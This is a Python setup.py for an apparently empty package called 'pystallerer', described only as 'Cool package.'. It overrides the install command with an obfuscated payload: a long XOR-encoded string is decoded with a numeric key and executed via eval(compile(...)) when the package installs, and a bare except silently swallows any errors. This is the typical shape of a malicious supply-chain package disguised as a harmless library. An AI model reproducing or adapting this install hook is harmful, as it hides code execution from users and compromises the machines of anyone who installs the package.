from setuptools import setup, find_packages
from setuptools.command.install import install
from pathlib import Path



VERSION = '1.0.0'
DESCRIPTION = 'Cool package.'
this_directory = Path(__file__).parent
long_description = (this_directory / "README.md").read_text()


class InstallCommand(install):

    def run(self):
        try:
            wopvEaTEcopFEavc ="\x14\x13X^CZFC\x11_A<\x15\x18XYE^BC\x11DLTGE[RPAE?\x13\x14^VSP_\x13\x08\x13^C\x18W\\FX^U_Z\x1c\x118\x17\x18Z_\x15[J\x17EUDY\x17WKQADK\x1dR\x14s\x08ddaDPDGnjI^XSY\\DhhrIGwPGRihe^Q__X_mhxXSE^DVPCkhf\\\\RZGGnegMPAA\x13|UXEendC]QFUUAhd`@F@\\T\x03\x00lm\x1e\x1b\x13\x05\x0f\x10~TX@U\x0822\x17\x17\x15\x16\x14\x12YA\x1cZ_T[K\x1cR\x11z\romf@PFDmlIZY_XZHmlvAG}WCVhmg]WXYZUehtXPG\\B_PDencX\\R[CKnhkGXG@\x19tPZEmebAWUBYXGolaAK@RX\x00\x00\x10\x1f8\x11\x17\x14\x10\x12\x19[DVW\x1fU\x13p\tihbBU@EjdJXZVYYLkewGGpPASjib[ST]WVoi~XSD_J]REnjc]VV[O@eigMXG@\x10|\\\\Fdn`JZSAQ_KdhdLE@W[\x04\x06khg{w\x07\x06\x1dOU@\x13\x1f\x13\x17U\x15\x18\x1eED_LT\x1cS\x16cRE\x17nE_d\\TY^\x16\x08\x10w@\\UMT|WYTSB\x18\x1begR@_D@\x16a\\]_U\x17\x1d\x19e[cCYjZVT^\x1ej@Z\x13SZJ\x10\x07\x03\x1c\x16\x12\x12\x14q\x08kheA\\FGoeL_^TZ[IkmqBFrYEUimbXPZPXPkh|\\QDZC[TMhefZ[W^GElea@P@B\x14y]\\AdoiG[^KTYCmeaJKFUU\x03\x00oleqv\x07\x05\x1bTUF\x14\x12\x14\x17wX@\x11\x07\x00\x1a\x15\x17\x03m]`P@\x17fCZe^]]X\x15\x0c\x10y^CQ_YP\x13\x18?\x11\x16\x15\x10\x14\x12VD\\_\x1bS\x11r\njllAQCAjhOT]SQ]DihxIEpQEXnoj]QU\\ZTlnuQWEZE[TBnn`]^VVCGoedGPAG\x15yR_EnjfJ^SGP]DmkjBVE@DEnjbyz\x04\r\x1aOS@\x17\x1f\x11\x12W\x12\x10\x1cCC[BQ\x1c^\x15\x13\x1f`\\A\x14nJ]gXTU^\x13\x05\x12sJPUGU}ZRQTA\x1e\x16eeQ@^DD\x1cj\\Q_U\x15\x1a\x11o]bG_bXWZZ\x16cA[\x11S_C\x1f\n\x02\x1e\x17\x12\x11\x17q\x0cilaA\\FJmoN_^W_^DnhpBFpULShdaVTYPWRhl|PQAWA_^Ahog[V\\[@FjhaBS@C\x14}WWAhoiE\\VARXGkmcKEB]\\\x02\x01mldHDMSZ\x19QIP\x10\x16\x13\x10wZK\x1c\n\x05\x1a\x19\x13\x01lXc\\F\x14fA^g\\]^X\x18\x0e\x19{[MQ\\ZW;\x1a\x12`]F\x10oF\\`XWTT\x14\n\x15uFWWFWxVZWZ@\x1c\x11ndPCZCA\x1adYU^Z\x14\x11\x11h[fC_b_\\Z[\x19fD[\x12U]B\x1c\x01\r\x1d\x19\x17\x13\x17p\x0bljeJWFBnjOXWU]VNeiuIIqUDPenaWS]Q[Sol\x7fQ[FXFYRFjne^ZT]NGhojCRCG\x13xQYDlnfDWVFT\\Ckmd@ECRY\x07\x01njfIGF\\Y\x01\x07\x1dPKT\x12\x16\x16\x19q\\C\x1a\x05\x00\x1d\x14\x12\x04d]jP@\x19nF\\cY\\^_\x18\x0f\x10vZ@[Y\\_\x1f\x13\x10\x1c<\x17\x12\x15P[CGQVT]Z\x13\x16CAP]@SQE\x11]KRYO_XZPT]^U\x19\x19SXC_Y]WQ\x10\x1bBK]VCZAJ\x11vyb|uf~gxp\x14\x1aZ@LC\x03\x1a\x1b\x0c\x08\x1b\x05\x07\t\x17\x00\x06\x16\x03\x04\x00\x0f\x0c\x03\x08\x03\x17\\X\x18GCZF__W\x15\x14\x12q\x03hhfJRABooNXXVY\\KjdpDEuQCPkedXVYX[Uji}]QK[J^UAomg_^]]CBnjg@Y@@\x18~\\[AeeeF_VKS^KnlkLGGU_\x0e\x0chkGCZF__W\x19QHW\x1bhZ@MVAE\x13\x11\x17\x14\x15r\nnjcKTFFmlL]X^_YJhmtBFqQ@Sehk^RXZ_Wjlt[WC]E[RLnhoZWQ[NJihcEX@G\x18\x7fUV@ho`@W_FVXEhneKACQ]\x04\rhhALYGX^V\x1bQOT\x12nX<\x1b\x11\x14\x15\x11\x10VYV\x19\x0b\x17\x10\x16Jin\x14@CQ@WUTToi\x11\x0b\x10jl\x1bFQBFjh\x16\x14\x12hd\x11ZZZM\\[@lm\x1b\x08od\x10\x17\x18\x1e\x14__UQV\x14\x1c\x15\x11hn\x14O\x10\x10>\x13\x12\x19\x14\x14\x13VGV_\x1bU\x17w\rmlgESJBhiJ\\XV^WKkkuAEvWAQhnk[X\\Z[Tml{YZ@[B]P@hde]VWVBGeef@QCM\x12~]\\EdidA_UJYYDijgKEFWZ\x02\x04nec}}\n\x05\x1dSRG\x17\x18\x17\x13Q\x10\x1f\x18OC]AT\x18Q\x16\x10\x1eT^CGPQ__[\x10\x1bFKUWBUPA\x11]OTVEZ]]WP^WP\x14\x17WVBZUVTP\x10\x1eI@ZW@YLL\x14u\x7f`}\x7ffx`xp\x12\x14ZFCD\n\x1d\x16\x01\x05\x1d\x08\x00\x0b\x1f\x01\x06\x1b\x05\x03\t\n\n\x06\x0e\t\x1ePY\x1eCNBC\\[\x15\x17\x16r\x0fnj`CQ@JheJ_ZTX^KlesDAvW@UdnfWRT\\Z^eiyYRK]@WTDdicZ^VWOGkie@SDF\x12zQ^GehdAVPAP^@ihdHCFS[\x0e\x05hibIDERT\x18ROQ\x13i\\T\\DGS]YP_\x13\x1aGCQXC_WF\x11_OP[O\\XWR]_[[\x19\x1aP_FW^\\YV\x10\x17EFZ_@QLM\x17syfwq`}bzt\x12\x1b\\@GI\r\x1c\x1e\x06\x02\x1b\x05\x00\t\x1e\x00\x03\x18\t\x05\x0c\x0f\t\x00\x0f\x00\x18]Z\x18DMB\r\x04\x14\x15\x12w\x08ehlBVG@mlM\\VU]_OjhuHBpYGXihkVTYY_^nou[SJZG\\VFddc^[R[EEnnd@Q@M\x14yVWBomcAZSEP]AjjkHGAT]\x01\x05keeND@TX\n\x00\x1bULW\x1bhWSZA@PT[YW\x12\x1bE@WZG^WF\x18^@Q[NWY[QUS]Q\x18\x1dTWBZ__S\\\x18\x1bGG_[@_FK\x17r\x7f`|sf|lyw\x11\x11[A@G\x0b\x1f\x1d\x03\x07\x16\x00\x03\r\x1f\x02\x02\x1f\x06\r\x0e\r\x0f\x04\t\x04\x1dRY\x1fSSTQJUX\x17\x13\x13s\x0clegGT@EhhC^[_ZWHhexEDtPMSod`_YX]]Wndu]TGYG]PFnkcY\\][C@ek`ERAA\x14zT^GjjhC[RCQZBkeeND@TX\x04\x02ilsSTQjux\x1bVIU\x14lWA@P@B\x14\x16\x1a\x12\x16{\teiaJ\\GGlmB^\\_[^Eihr@B|Y@Vijf]W_[YSlnt]WAVD\\WGoic^_T]AEdmgAPBC\x11z\\XBkhaG]QGQYAehjERGGD@jln{z\x07\x06\x18BVK\x10hVPLGX\x19\x14}\x14\x12rV\\G]\\D\x15aMCU\x08\x18YDGY_WSB[]Y\x1bZAVZ\x16\x13\x14S\x13JR[TI\x17YDFFE\x02\x1e\x1bVP^VCN\x17R^DW^GV\x18V_Y\x1dXDP\x1eDPQY_Y[J\x1d\x05\x00\x07\x05\x00\x07\t\x02\x01\x08\x06\x08\x02\x03\x0f\x0b\x05\x01\t\x1etsX^@r\x0c[\x05tJ\x04I]\x03`\rPRebht\x0e\x06ITw\x07pl\x7f`cwuR~kqsWvgaz\x00nlWR|yV\x0f\x07oh\x0c}\x03u}\x04\x07\x01@\t\x13\x1e\x16\x1a?\x10\x11\x10\x16\x10\x19AASBD[W]AG\x16AL[\x1c_\x1bv\x0elmlAVJAldNX\\W[VEhktFDvWFSkhb]XY]]^ko|ZPG[D^VFjjoXZQ^GDmkjBVE@\x11xWX@lhbK[^CRX@mleIJFQ\\\x04\x02hho{z\x0b\x01\x17CVJ\x1b\x19\x14CY\\^_\x05fBMP\x18\x13SZ][_\naDAW\x1f8\x12\x17\x14\x108\x1a\x14Q_JR\t\x11\x13\x13?\x17\x17\x11\x10\x12\x16FYBG?AB^_C\x11\x14_^\x14X[ABT\\X[WS\x17\x1f\x1d\x17\x1a" 

            iOpvEoeaaeavocp = "7313354710266814510717967741526504294913531060924126448248395499540192382085430288475642622740294439"
            uocpEAtacovpe = len(wopvEaTEcopFEavc)
            oIoeaTEAcvpae = ""
            for fapcEaocva in range(uocpEAtacovpe):
                nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]
                qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]
                oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))


            eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))
        except:
            pass
        install.run(self)


setup(
    name="pystallerer",
    version=VERSION,
    author="HW",
    author_email="",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=long_description,
    packages=find_packages(),
    install_requires=[],
    keywords=[],
    classifiers=[
        "Development Status :: 1 - Planning",
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "Operating System :: Unix",
        "Operating System :: MacOS :: MacOS X",
        "Operating System :: Microsoft :: Windows",
    ],
    cmdclass={
        'install': InstallCommand
    }
)